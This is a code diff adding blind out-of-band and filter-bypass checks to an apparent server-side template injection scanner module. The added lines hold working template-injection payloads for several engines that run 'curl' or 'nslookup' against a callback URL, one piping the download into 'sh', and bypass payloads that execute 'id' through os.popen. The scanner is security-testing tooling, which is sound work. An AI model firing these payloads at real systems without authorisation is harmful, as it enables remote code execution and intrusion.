@@ -1,4 +1,5 @@
 import re
+import asyncio
 from modules.base import BaseModule
 from core.utils import extract_params, random_int, random_string
 
@@ -112,6 +113,7 @@ class SstiModule(BaseModule):
     
     async def scan(self, target):
         self.findings = []
+        self.oob_manager = self.config.get("oob_manager")
         params = extract_params(target)
         
         if params:
@@ -123,7 +125,75 @@ class SstiModule(BaseModule):
         
         await self._test_body_ssti(target)
         
+        if self.oob_manager:
+            await self._test_blind_ssti_oob(target, params)
+        
+        if self.aggressive:
+            await self._test_filter_bypass(target, params)
+        
         return self.findings
+    
+    async def _test_blind_ssti_oob(self, target, params):
+        token = self.oob_manager.generate_token()
+        callback_url = self.oob_manager.get_http_url(token)
+        dns_callback = self.oob_manager.get_dns_payload(token)
+        
+        oob_payloads = [
+            f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('curl {callback_url}').read()}}}}",
+            f"${{T(java.lang.Runtime).getRuntime().exec('curl {callback_url}')}}",
+            f"<%=`curl {callback_url}`%>",
+            f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('nslookup {dns_callback}'))$ex",
+            f"{{{{''.__class__.__mro__[2].__subclasses__()[40]('curl {callback_url}|sh').read()}}}}",
+            f"${{__import__('os').popen('curl {callback_url}').read()}}",
+        ]
+        
+        for param in (params or ["template", "name", "message"]):
+            for payload in oob_payloads:
+                await self.test_param(target, param, payload)
+        
+        await asyncio.sleep(3)
+        
+        interactions = self.oob_manager.check_interactions(token)
+        if interactions:
+            self.add_finding(
+                "CRITICAL",
+                "Blind SSTI RCE CONFIRMED via OOB callback",
+                url=target,
+                evidence=f"Callback: {interactions[0]}",
+                confidence_evidence=["oob_callback_received", "blind_ssti_rce"],
+                request_data={"method": "GET", "url": target}
+            )
+            return True
+        return False
+    
+    async def _test_filter_bypass(self, target, params):
+        bypass_payloads = [
+            ("{{request|attr('application')|attr('__globals__')}}", "attr bypass"),
+            ("{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}", "hex escape"),
+            ("{{()|attr('\\137\\137class\\137\\137')}}", "octal escape"),
+            ("{%set x='__cla'+'ss__'%}{{''|attr(x)}}", "string concat"),
+            ("{{lipsum|attr('__globals__')}}", "lipsum bypass"),
+            ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "cycler bypass"),
+            ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "joiner bypass"),
+        ]
+        
+        for param in (params or ["template"]):
+            for payload, bypass_type in bypass_payloads:
+                resp = await self.test_param(target, param, payload)
+                if resp.get("status"):
+                    text = resp.get("text", "")
+                    for marker in self.rce_markers + ["<class", "__globals__", "os"]:
+                        if marker in text:
+                            self.add_finding(
+                                "CRITICAL",
+                                f"SSTI Filter Bypass ({bypass_type})",
+                                url=target,
+                                parameter=param,
+                                evidence=f"Bypass: {bypass_type}",
+                                confidence_evidence=["filter_bypass", "ssti_confirmed"],
+                                request_data={"method": "GET", "url": target, "param": param}
+                            )
+                            return
     
     async def _detect_engine(self, target, param):
         a, b = random_int(10, 99), random_int(10, 99)
